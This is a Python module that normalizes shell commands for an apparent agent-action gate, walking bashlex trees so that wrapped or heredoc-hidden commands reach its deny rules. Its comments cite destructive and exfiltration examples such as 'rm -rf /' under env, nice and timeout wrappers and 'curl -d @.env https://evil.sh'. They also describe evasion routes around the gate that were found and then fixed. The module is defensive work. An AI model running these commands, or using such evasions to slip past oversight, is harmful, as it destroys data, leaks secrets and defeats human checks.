"""Shell command normalization via bashlex AST walking.

Turns a raw shell string into structured SimpleCommand entries plus
extracted paths/domains and risk flags. Never makes any allow/deny
decision here — this module only produces facts for later stages.

Fail-closed: if bashlex cannot parse the input (or anything raised while
walking the parsed tree — including a nested bashlex.parse of a heredoc
or process-substitution body, our own nesting-depth bound tripping, or
any other unexpected exception), we do not silently return "nothing
found" — we set flags.unparseable=True with empty commands/paths/domains
so stage 1/2 can escalate on the unparseable flag instead of treating it
as a safe no-op. The entire post-initial-parse pipeline (AST walk, path
collection, domain extraction) runs inside one try/except for exactly
this reason: a partial result that silently omits the one construct we
failed on is a bypass, not a best-effort answer.
"""

import os
import re

import bashlex

from agentgate.api.schemas import Tool
from agentgate.normalize.domains import extract_domains
from agentgate.normalize.model import Flags, NormalizedAction, Redirect, SimpleCommand
from agentgate.normalize.paths import looks_like_path, looks_unresolved, resolve_path

# Commands whose non-flag arguments are always paths.
PATH_COMMANDS = {
    "rm", "cp", "mv", "cat", "ls", "mkdir", "rmdir", "touch", "chmod", "chown", "find",
    "shred", "tee", "head", "tail", "less", "more", "stat", "du", "tar", "unzip", "zip",
    "sed", "awk", "wc", "grep", "rg", "ln", "truncate", "dd", "cd",
}
_EVAL_LIKE = {"eval", "exec", "source", "."}
_VAR = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")
_BRACE_EXPANSION = re.compile(r"\{[^{}]*,[^{}]*\}")

# argv[0] values (matched by basename, so "/bin/bash" counts too) for
# which a heredoc/here-string body is executable code, not inert data —
# see _is_shell_exe.
_SHELL_NAMES = {"sh", "bash", "zsh", "dash"}

# Common wrappers that run their remaining argv as a command without
# being a shell themselves: `env bash <<EOF`, `sudo bash <<EOF`. Looked
# past (one level, plus its leading option flags) when deciding whether
# a command ultimately reaches a shell — fix round 2, Critical 2
# residual part 3. nice/setsid/stdbuf added (stage 1 fix round 2,
# Important C): all three exec their remaining argv with stdin passed
# through unchanged, exactly like env/nohup/timeout/sudo/doas, so
# `nice bash <<EOF` reaches the shell's stdin just as much as
# `env bash <<EOF` does.
_WRAPPER_CMDS = {"env", "command", "nohup", "timeout", "sudo", "doas", "nice", "setsid", "stdbuf"}

# Bound on our OWN recursive descent into heredoc/here-string bodies and
# command/process substitutions (fix round 2, New Important B). Each
# heredoc level forces a fresh bashlex.parse() call on a body that
# contains every level below it, so unbounded nesting is quadratic-ish
# in wall time — measured ~270ms at depth 400 on a few KB of input, well
# under the 32KB raw cap, before this bound existed. Eight is far past
# any legitimate script.
_MAX_NESTING_DEPTH = 8


class _MaxNestingDepthExceeded(Exception):
    """Internal signal only — never surfaces to callers. Raised when our
    own recursive descent (heredoc/here-string body reparse, or
    command/process substitution walk) would exceed _MAX_NESTING_DEPTH.
    Caught by normalize_shell's fail-closed wrapper exactly like any
    other unparseable input, so bounding depth costs no extra plumbing
    beyond the fail-closed mechanism Critical 1/2 already established.
    """


def _is_shell_exe(argv0: str) -> bool:
    return os.path.basename(argv0) in _SHELL_NAMES


def _shell_after_wrappers(tokens: list[str]) -> bool:
    """True if ``tokens`` (an argv-shaped list of literal words) ultimately
    names a shell, looking past leading wrapper commands (env, sudo, ...)
    and everything those wrappers consume before the command they run.

    Delegates to ``resolve_effective_argv`` rather than repeating the
    skip loop (stage 1 fix round 2, Important C). The private copy this
    replaced skipped only leading "-" flags at one wrapper level, so it
    missed every form ``resolve_effective_argv`` already knew about:
    ``nice -n 10 bash <<EOF``, ``stdbuf -o 0 bash <<EOF`` (a wrapper
    option whose value is a separate token), ``timeout 30 bash <<EOF``
    (the duration positional) and ``env FOO=bar bash <<EOF`` (env's own
    NAME=VALUE syntax) all resolved to a non-shell word, so the heredoc
    body was filed as inert data and its commands were never parsed —
    each one a silent bypass of every rule that reads
    ``action.commands``, confirmed by direct reproduction. Two divergent
    copies of the same "what does this argv really run" logic is exactly
    the drift this consolidation removes.
    """
    resolved = resolve_effective_argv(tokens)
    if not resolved:
        return False
    return _is_shell_exe(resolved[0])


# "timeout [OPTIONS] DURATION COMMAND [ARG]..." carries one required
# positional (the duration) between the wrapper name/flags and the
# wrapped command, unlike env/sudo/nohup/doas/command which go straight
# from flags to the command. Recognized narrowly (digits with an
# optional single-letter suffix) so resolve_effective_argv can skip it
# too — see resolve_effective_argv.
_TIMEOUT_DURATION = re.compile(r"^\d+(\.\d+)?[smhd]?$")

# env's OWN primary syntax is "env [OPTIONS] [NAME=VALUE]... COMMAND
# [ARG]...", not just flags — `env FOO=bar rm -rf /` is standard env
# usage, and "FOO=bar" is a plain word token in argv (not a bashlex
# assignment part, since it's an argument TO env, not a shell-level
# assignment prefix on the command). resolve_effective_argv must skip
# these too, or `env FOO=bar <anything>` resolves to "FOO=bar" as the
# (bogus) effective command instead of unwrapping to <anything> — stage
# 1 fix round 2, Important C.
_ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

# Wrapper options whose value is a SEPARATE argv token, per wrapper.
# Without these, the leading-flag skip below stops on the option's own
# value — `nice -n 10 rm -rf /` resolved to argv ["10", "rm", "-rf", "/"]
# and every stage 1 rule then saw an effective command named "10" and
# said nothing at all (verified by direct reproduction; stage 1 fix round
# 2, Important C). Only options whose argument is MANDATORY are listed:
# an optional-argument option (xargs -i/-l/-e, env -i) must not consume
# the following token, which may be the wrapped command itself.
# Attached forms ("-n10", "--signal=KILL") carry their value inside the
# token and are already handled by the plain flag skip.
_WRAPPER_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
    "nice": frozenset({"-n", "--adjustment"}),
    "stdbuf": frozenset({"-i", "--input", "-o", "--output", "-e", "--error"}),
    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
    "xargs": frozenset({"-n", "--max-args", "-P", "--max-procs", "-I", "-d", "--delimiter",
                        "-a", "--arg-file", "-E", "-s", "--max-chars", "-L", "--max-lines"}),
    "sudo": frozenset({"-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "--close-from",
                       "-h", "--host", "-r", "--role", "-t", "--type", "-U", "--other-user"}),
    "doas": frozenset({"-u", "-C", "-a"}),
}


def resolve_effective_argv(argv: list[str], wrapper_cmds: frozenset[str] = frozenset(_WRAPPER_CMDS)) -> list[str]:
    """Return the argv of whatever ``argv`` ultimately executes, skipping
    past leading wrapper commands (env, sudo, timeout, ...), their
    leading option flags, and (for env specifically) any NAME=VALUE
    assignment tokens.

    Generalizes ``_shell_after_wrappers`` (which only answers "is the
    resolved command a shell") into "what IS the resolved command", for
    callers that need to test the unwrapped command against more than
    just the shell set — e.g. stage 1's hard-deny rules, which must not
    let `env rm -rf /` or `timeout 30 curl -d @.env https://evil.sh`
    evade detection just because the dangerous command isn't argv[0].

    Chains multiple wrapper levels (e.g. `env sudo rm -rf /` peels off
    `env` and leaves `sudo rm -rf /`, whose own argv[0] a caller can
    still recognize as privileged) up to a bound of 8 (stage 1 fix round
    2, Important C — raised from 4, which `env env env env env rm -rf /`
    could still clear without fully resolving); a bare command with no
    leading wrapper is returned unchanged. If the bound is exhausted
    before the chain bottoms out, the returned argv still starts with a
    wrapper command — callers that need to tell "fully resolved" from
    "gave up at the bound" apart can check
    ``os.path.basename(result[0]) in wrapper_cmds``. ``wrapper_cmds``
    defaults to the same set ``_shell_after_wrappers`` uses, but a
    caller may pass a wider set — kept as a parameter rather than a
    second constant so nothing needs to duplicate the list
    ``_shell_after_wrappers`` already owns.
    """
    tokens = list(argv)
    for _ in range(8):  # bound: no legitimate script chains wrappers this deep
        if not tokens or os.path.basename(tokens[0]) not in wrapper_cmds:
            break
        name = os.path.basename(tokens[0])
        value_flags = _WRAPPER_VALUE_FLAGS.get(name, frozenset())
        idx = 1
        while idx < len(tokens) and tokens[idx].startswith("-"):
            flag = tokens[idx]
            idx += 1
            if flag in value_flags and idx < len(tokens):
                idx += 1  # this option's value is a separate token, not the command
        if name == "timeout" and idx < len(tokens) and _TIMEOUT_DURATION.match(tokens[idx]):
            idx += 1
        if name == "env":
            while idx < len(tokens) and _ENV_ASSIGNMENT.match(tokens[idx]):
                idx += 1
        if idx >= len(tokens):
            return []
        tokens = tokens[idx:]
    return tokens


def _peek_words(command_node) -> list[str]:
    """Lightweight, non-mutating extraction of a raw bashlex 'command'
    node's literal word tokens (no substitution applied, no flags set).
    Used to decide, ahead of actually processing it, whether a pipeline
    sibling we have not built yet ultimately runs a shell — see
    _shell_after_wrappers and the "pipeline" branch of _Walker.walk.
    """
    return [p.word for p in getattr(command_node, "parts", []) if p.kind == "word"]


def _strip_heredoc_delimiter(body: str, delimiter: str) -> str:
    """bashlex's HeredocNode.value includes the terminating delimiter
    line itself (a quirk of its heredoc gathering, confirmed against
    bashlex 0.18) — strip it so the body we hand back to bashlex.parse
    is the here-document content only, not content-plus-delimiter.
    """
    lines = body.split("\n")
    if lines and lines[-1] == delimiter:
        lines = lines[:-1]
    return "\n".join(lines)


class _Walker:
    """Walks a bashlex AST and accumulates SimpleCommand entries + flags."""

    def __init__(self, cwd: str) -> None:
        self.cwd = cwd
        self.commands: list[SimpleCommand] = []
        self.flags = Flags()
        self.assignments: dict[str, str] = {}
        self._pipeline_counter = 0
        self.depth = 0

    def _next_pipeline(self) -> int:
        self._pipeline_counter += 1
        return self._pipeline_counter

    def _push_nesting(self) -> None:
        self.depth += 1
        if self.depth > _MAX_NESTING_DEPTH:
            raise _MaxNestingDepthExceeded(
                f"nested heredoc/substitution depth exceeded {_MAX_NESTING_DEPTH}"
            )

    def _pop_nesting(self) -> None:
        self.depth -= 1

    def _parse_and_walk_bodies(self, bodies: list[str]) -> None:
        """Reparse each heredoc/here-string body as a fresh shell script
        and walk the result, exactly like a top-level normalize_shell
        call — used when the body is executable code (see the "command"
        and "pipeline" branches of walk() for when that applies). Each
        body counts as one level of our own nesting-depth bound; if the
        nested bashlex.parse itself fails, the exception propagates out
        to normalize_shell's fail-closed wrapper like any other parse
        failure.
        """
        for body in bodies:
            self._push_nesting()
            try:
                for tree in bashlex.parse(body):
                    self.walk(tree)
            finally:
                self._pop_nesting()

    def walk(self, node, pipeline_id: int | None = None) -> None:
        kind = node.kind
        if kind == "pipeline":
            pid = self._next_pipeline()
            parts = [p for p in node.parts if p.kind != "pipe"]
            # Any command anywhere in this pipeline being a (possibly
            # wrapped) shell means a heredoc/here-string body attached
            # to ANY command in the same pipe is executable code once it
            # reaches that shell's stdin — not only when the heredoc
            # syntax and the shell happen to be the same command, e.g.
            # `cat <<EOF | bash` (fix round 2, Critical 2 residual
            # part 2). This pre-scan only looks at direct "command"
            # siblings; a subshell/compound piped into a shell is not
            # specially detected here and simply keeps its heredoc body
            # opaque, a narrow, disclosed limitation.
            pipeline_has_shell = any(
                _shell_after_wrappers(_peek_words(p)) for p in parts if p.kind == "command"
            )
            pending_bodies: list[str] = []
            for part in parts:
                if part.kind == "command":
                    bodies, _argv = self._command(part, pid)
                    pending_bodies.extend(bodies)
                else:
                    self.walk(part, pid)
            if pipeline_has_shell:
                self._parse_and_walk_bodies(pending_bodies)
            return
        if kind == "command":
            pid = pipeline_id if pipeline_id is not None else self._next_pipeline()
            bodies, argv = self._command(node, pid)
            if bodies and _shell_after_wrappers(argv):
                self._parse_and_walk_bodies(bodies)
            return
        if kind == "compound":
            for part in node.list:
                self.walk(part)
            return
        if kind in ("list", "for", "while", "until", "if", "function"):
            for part in getattr(node, "parts", []):
                if part.kind != "operator":
                    self.walk(part)
            return
        # Anything else we don't specifically handle (e.g. reservedword,
        # operator nodes reached directly): recurse into any child parts
        # so we never silently drop a command hidden inside it.
        for part in getattr(node, "parts", []):
            self.walk(part)

    def _word_value(self, word_node) -> str:
        value = word_node.word
        for part in getattr(word_node, "parts", []):
            if part.kind in ("commandsubstitution", "processsubstitution"):
                # $(...) / `...` (commandsubstitution) and <(...) / >(...)
                # (processsubstitution) are structurally identical in
                # bashlex: both carry a nested .command AST. Reuse the
                # same walk() so the inner command surfaces in
                # self.commands exactly like a piped or substituted one.
                self.flags.has_subst = True
                self._push_nesting()
                try:
                    self.walk(part.command)
                finally:
                    self._pop_nesting()
            elif part.kind == "parameter":
                m = _VAR.match(value)
                if m and m.group(1) in self.assignments:
                    value = self.assignments[m.group(1)]
                    self.flags.has_env_assign = True
                else:
                    # A $VAR/${VAR} we cannot resolve from a same-line
                    # assignment (either it's embedded in a larger token
                    # like "$HOME/dist", or it's a whole-word reference to
                    # a variable we never saw assigned). The literal text
                    # is kept in argv; downstream path collection must not
                    # fabricate a resolved path from it.
                    self.flags.has_unresolved_expansion = True
            elif part.kind == "tilde":
                if part.value != "~":
                    # ~user (not a bare ~ or ~/...): same "cannot resolve
                    # without runtime state" class as an unresolved $VAR.
                    self.flags.has_unresolved_expansion = True
        if _BRACE_EXPANSION.search(value):
            # bashlex does not decompose brace expansion into word parts
            # (it stays a single literal token), so this check is
            # independent of the parts loop above.
            self.flags.has_unresolved_expansion = True
        return value

    def _command(self, node, pipeline_id: int) -> tuple[list[str], list[str]]:
        """Build one SimpleCommand from a bashlex 'command' node.

        Returns (heredoc_bodies, argv) rather than deciding itself
        whether to parse the bodies as code: that decision depends on
        context this method doesn't have (whether a *sibling* command in
        the same pipeline is a shell — fix round 2, Critical 2 residual
        part 2), so it's made by the caller in walk().
        """
        argv: list[str] = []
        redirects: list[Redirect] = []
        stdin_from: str | None = None
        heredoc_bodies: list[str] = []
        for part in node.parts:
            if part.kind == "assignment":
                name, _, val = part.word.partition("=")
                self.assignments[name] = val
                self.flags.has_env_assign = True
            elif part.kind == "word":
                argv.append(self._word_value(part))
            elif part.kind == "redirect":
                if part.type in ("<<", "<<-"):
                    self.flags.has_heredoc = True
                    delimiter = part.output.word if hasattr(part.output, "word") else ""
                    raw_body = part.heredoc.value if part.heredoc is not None else ""
                    heredoc_bodies.append(_strip_heredoc_delimiter(raw_body, delimiter))
                    continue
                if part.type == "<<<":
                    self.flags.has_heredoc = True
                    # output carries the here-string content directly (and
                    # already exposes any $(...) inside it as a
                    # commandsubstitution part, handled by _word_value
                    # below like any other word).
                    content = self._word_value(part.output) if hasattr(part.output, "word") else ""
                    heredoc_bodies.append(content)
                    continue
                if not hasattr(part.output, "word"):  # e.g. 2>&1 duplicates a descriptor, no file
                    continue
                target = self._word_value(part.output)
                if target.startswith("/dev/"):
                    target_path = target
                elif looks_unresolved(target):
                    # Don't fabricate an absolute path from a redirect
                    # target we can't actually resolve (e.g. `> $OUT`).
                    # _word_value above only sets has_unresolved_expansion
                    # from a bashlex parameter/tilde *part*, which quoting
                    # or escaping suppresses — set it here too so a
                    # dropped target is never silent (fix round 2, New
                    # Important A).
                    self.flags.has_unresolved_expansion = True
                    target_path = target
                else:
                    target_path = resolve_path(target, self.cwd)
                op = f"{part.input}{part.type}" if isinstance(part.input, int) else part.type
                redirects.append(Redirect(op=op, target=target_path))
                if part.type == "<":
                    stdin_from = target_path
        if argv and argv[0] in _EVAL_LIKE:
            self.flags.has_eval = True
        if argv:
            self.commands.append(
                SimpleCommand(
                    argv=argv,
                    redirects=redirects,
                    stdin_from=stdin_from,
                    pipeline_id=pipeline_id,
                    # Recorded unconditionally, whether or not this body
                    # ends up being parsed as code below — action_hash()
                    # must differ between two actions whose heredoc
                    # bodies differ, even when neither is understood
                    # structurally (fix round 2, Critical 2 residual
                    # part 1).
                    heredoc_bodies=list(heredoc_bodies),
                )
            )
        return heredoc_bodies, argv


def _collect_paths(commands: list[SimpleCommand], cwd: str, flags: Flags) -> list[str]:
    paths: list[str] = []

    def add(p: str) -> None:
        if p not in paths:
            paths.append(p)

    for cmd in commands:
        exe = cmd.argv[0]
        args = cmd.argv[1:]
        for i, tok in enumerate(args):
            if looks_unresolved(tok):
                # May already be flagged (via a bashlex parameter/tilde
                # part in _word_value), but a quoted/escaped "$"/"~"
                # produces no such part — bashlex hands us plain literal
                # text — so set it here too rather than assuming
                # upstream already did (fix round 2, New Important A:
                # dropping a path must never be silent).
                flags.has_unresolved_expansion = True
                continue
            if exe in PATH_COMMANDS:
                if tok.startswith("-"):
                    continue
                if exe == "find" and i > 0 and args[i - 1] in ("-name", "-iname", "-path", "-type", "-exec"):
                    continue
                if exe in ("find",) and tok.startswith("*"):
                    continue
                add(resolve_path(tok, cwd))
            elif looks_like_path(tok):
                add(resolve_path(tok, cwd))
        for r in cmd.redirects:
            if r.target.startswith("/dev/"):
                continue
            if looks_unresolved(r.target):
                flags.has_unresolved_expansion = True
                continue
            add(r.target)
    return paths


def normalize_shell(raw: str, cwd: str) -> NormalizedAction:
    action = NormalizedAction(tool=Tool.shell, cwd=cwd, raw=raw)
    try:
        trees = bashlex.parse(raw)
        walker = _Walker(cwd)
        for tree in trees:
            walker.walk(tree)
        commands = walker.commands
        flags = walker.flags
        paths = _collect_paths(commands, cwd, flags)
        domains: list[str] = []
        for c in commands:
            for d in extract_domains(c.argv):
                if d not in domains:
                    domains.append(d)
    except Exception:
        # Catches bashlex's own tokenizer/parser errors on the initial
        # parse, AND any exception raised while walking the tree or
        # collecting paths/domains afterwards — including a nested
        # bashlex.parse() failure on a heredoc or process-substitution
        # body, our own _MaxNestingDepthExceeded bound tripping, or a
        # urllib ValueError that slipped past extract_domains' own
        # guard. Any of these must fail closed as a whole: a partial
        # commands/paths/domains result built before the failure is
        # discarded rather than returned, so we never claim "nothing
        # suspicious" about an action we only partially understood.
        action.flags.unparseable = True
        return action
    action.commands = commands
    action.flags = flags
    action.paths = paths
    action.domains = domains
    return action
